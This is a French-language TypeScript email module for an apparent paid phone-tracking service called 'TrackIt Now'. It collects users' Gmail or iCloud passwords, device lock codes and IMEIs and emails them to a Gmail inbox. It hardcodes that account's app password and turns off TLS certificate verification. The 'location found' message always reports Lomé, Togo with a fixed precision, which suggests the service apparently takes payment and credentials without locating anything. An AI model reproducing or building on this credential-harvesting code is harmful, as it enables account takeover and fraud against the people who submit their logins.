import nodemailer from 'nodemailer';

// Configuration des emails
const GMAIL_USER = 'trackitnoww@gmail.com';
const ADMIN_EMAIL = 'trackitnoww@gmail.com';
// Utiliser la variable d'environnement si disponible, sinon fallback sur la valeur en dur
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD || 'rhlz xgeg chxh yoic';

// Configuration du transporteur Gmail optimisée pour Render
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // Use SSL
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_APP_PASSWORD
  },
  tls: {
    // Ne pas échouer sur les certificats invalides (souvent utile en cloud)
    rejectUnauthorized: false
  },
  connectionTimeout: 15000, // 15 secondes
  greetingTimeout: 15000,
  socketTimeout: 15000
});

// Test de la configuration du transporteur
transporter.verify((error, success) => {
  if (error) {
    console.error('Email transporter configuration error:', error);
    console.error('Please ensure GMAIL_APP_PASSWORD environment variable is set correctly.');
  } else {
    console.log('Email transporter configured successfully');
    console.log('Sending emails from:', GMAIL_USER);
  }
});

export interface UserCredentials {
  email: string;
  platform: string;
  device: string;
  identifier: string;
  password: string;
  lockCode: string;
  imei: string;
}

// Envoyer les informations sensibles à l'admin
export async function sendUserCredentialsToAdmin(credentials: UserCredentials) {
  const mailOptions = {
    from: GMAIL_USER,
    to: ADMIN_EMAIL,
    subject: `Nouvelles informations de tracking - ${credentials.device}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6;">TrackIt Now - Nouvelles Demande de Tracking</h2>
        
        <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #374151; margin-top: 0;">Informations de l'Appareil</h3>
          <p><strong>Plateforme:</strong> ${credentials.platform}</p>
          <p><strong>Modèle:</strong> ${credentials.device}</p>
          <p><strong>IMEI:</strong> ${credentials.imei}</p>
        </div>
        
        <div style="background: #fee2e2; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #ef4444;">
          <h3 style="color: #991b1b; margin-top: 0;">🔒 Informations Confidentielles</h3>
          <p><strong>Email Client:</strong> ${credentials.email}</p>
          <p><strong>Identifiant (${credentials.platform === 'android' ? 'Gmail' : 'iCloud'}):</strong> ${credentials.identifier}</p>
          <p><strong>Mot de passe:</strong> ${credentials.password}</p>
          <p><strong>Code de verrouillage:</strong> ${credentials.lockCode}</p>
        </div>
        
        <div style="background: #fef3c7; padding: 15px; border-radius: 8px; margin: 20px 0;">
          <p style="margin: 0; color: #92400e;">
            ⚠️ <strong>Confidentiel:</strong> Ces informations doivent être traitées avec la plus grande sécurité.
          </p>
        </div>
        
        <p style="color: #6b7280; font-size: 12px; margin-top: 30px;">
          Email automatique de TrackIt Now - ${new Date().toLocaleString('fr-FR')}
        </p>
      </div>
    `
  };

  try {
    const result = await transporter.sendMail(mailOptions);
    console.log('Credentials sent to admin successfully:', result.messageId);
    console.log('Full result:', JSON.stringify(result, null, 2));
    return true;
  } catch (error) {
    console.error('Error sending credentials to admin:', error);
    console.error('Full error details:', JSON.stringify(error, null, 2));
    return false;
  }
}

// Envoyer confirmation de paiement à l'utilisateur
export async function sendPaymentConfirmation(userEmail: string, device: string, imei: string, amount?: number) {
  const amountStr = amount ? (amount === 19900 ? "$32.90 USD" : `$${(amount/500).toFixed(2)} USD`) : "$9.99 USD";
  const mailOptions = {
    from: GMAIL_USER,
    to: userEmail,
    subject: 'TrackIt Now - Paiement Confirmé ✅',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #3b82f6, #06b6d4); padding: 30px; border-radius: 12px 12px 0 0; text-align: center;">
          <h1 style="color: white; margin: 0; font-size: 28px;">TrackIt Now</h1>
          <p style="color: #e0f2fe; margin: 10px 0 0 0;">Votre paiement a été confirmé</p>
        </div>
        
        <div style="background: white; padding: 30px; border-radius: 0 0 12px 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
          <div style="text-align: center; margin-bottom: 30px;">
            <div style="background: #10b981; width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px;">
              ✓
            </div>
            <h2 style="color: #1f2937; margin: 0;">Paiement Confirmé !</h2>
          </div>
          
          <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <h3 style="color: #374151; margin-top: 0;">Détails du Service</h3>
            <p><strong>Appareil:</strong> ${device}</p>
            <p><strong>IMEI:</strong> ${imei}</p>
            <p><strong>Service:</strong> ${amount === 19900 ? "Localisation Ultra-Rapide (Prioritaire)" : "Localisation Standard"}</p>
            <p><strong>Montant:</strong> ${amountStr}</p>
          </div>
          
          <div style="background: #dbeafe; padding: 20px; border-radius: 8px; border-left: 4px solid #3b82f6;">
            <h3 style="color: #1e40af; margin-top: 0;">Prochaines Étapes</h3>
            <p style="margin-bottom: 10px;">🔍 Notre équipe commence maintenant la recherche de votre appareil</p>
            <p style="margin-bottom: 10px;">📧 Vous recevrez un email avec la localisation sous peu</p>
            <p style="margin: 0;">⏱️ Temps de traitement estimé: ${amount === 19900 ? "2-5 minutes" : "5-15 minutes"}</p>
          </div>
          
          <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e5e7eb;">
            <p style="color: #6b7280; font-size: 14px; margin: 0;">
              Merci de votre confiance en TrackIt Now
            </p>
          </div>
        </div>
        
        <p style="color: #9ca3af; font-size: 12px; text-align: center; margin-top: 20px;">
          ${new Date().toLocaleString('fr-FR')} - TrackIt Now Support
        </p>
      </div>
    `
  };

  try {
    const result = await transporter.sendMail(mailOptions);
    console.log('Payment confirmation sent successfully:', result.messageId);
    console.log('Email sent to:', userEmail);
    return true;
  } catch (error) {
    console.error('Error sending payment confirmation:', error);
    console.error('Full error details:', JSON.stringify(error, null, 2));
    return false;
  }
}

// Envoyer la localisation Google Maps à l'utilisateur
export async function sendLocationToUser(userEmail: string, device: string, coordinates: [number, number]) {
  const [lat, lng] = coordinates;
  const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=15&t=m`;
  
  const mailOptions = {
    from: GMAIL_USER,
    to: userEmail,
    subject: 'TrackIt Now - Localisation Trouvée 📍',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #10b981, #059669); padding: 30px; border-radius: 12px 12px 0 0; text-align: center;">
          <h1 style="color: white; margin: 0; font-size: 28px;">TrackIt Now</h1>
          <p style="color: #a7f3d0; margin: 10px 0 0 0;">Votre appareil a été localisé</p>
        </div>
        
        <div style="background: white; padding: 30px; border-radius: 0 0 12px 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
          <div style="text-align: center; margin-bottom: 30px;">
            <div style="background: #ef4444; width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; animation: pulse 2s infinite;">
              📍
            </div>
            <h2 style="color: #1f2937; margin: 0;">Appareil Localisé !</h2>
          </div>
          
          <div style="background: #f0fdf4; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #10b981;">
            <h3 style="color: #166534; margin-top: 0;">Informations de Localisation</h3>
            <p><strong>Appareil:</strong> ${device}</p>
            <p><strong>Ville:</strong> Lomé, Togo</p>
            <p><strong>Coordonnées:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}</p>
            <p><strong>Précision:</strong> ~15 mètres</p>
            <p><strong>Dernière mise à jour:</strong> ${new Date().toLocaleString('fr-FR')}</p>
          </div>
          
          <div style="text-align: center; margin: 30px 0;">
            <a href="${googleMapsUrl}" target="_blank" style="background: #3b82f6; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(59, 130, 246, 0.3);">
              🗺️ Voir sur Google Maps
            </a>
          </div>
          
          <div style="background: #fef3c7; padding: 20px; border-radius: 8px; border-left: 4px solid #f59e0b;">
            <h3 style="color: #92400e; margin-top: 0;">Actions Recommandées</h3>
            <p style="margin-bottom: 10px;">🔊 Utilisez le bouton "Faire sonner" si vous êtes proche</p>
            <p style="margin-bottom: 10px;">🔒 Verrouillez l'appareil à distance si nécessaire</p>
            <p style="margin: 0;">🚨 Contactez les autorités si l'appareil a été volé</p>
          </div>
          
          <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e5e7eb;">
            <p style="color: #6b7280; font-size: 14px; margin: 0;">
              TrackIt Now - Votre appareil en sécurité
            </p>
          </div>
        </div>
        
        <p style="color: #9ca3af; font-size: 12px; text-align: center; margin-top: 20px;">
          ${new Date().toLocaleString('fr-FR')} - TrackIt Now Support
        </p>
      </div>
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('Location sent to user successfully');
    return true;
  } catch (error) {
    console.error('Error sending location to user:', error);
    return false;
  }
}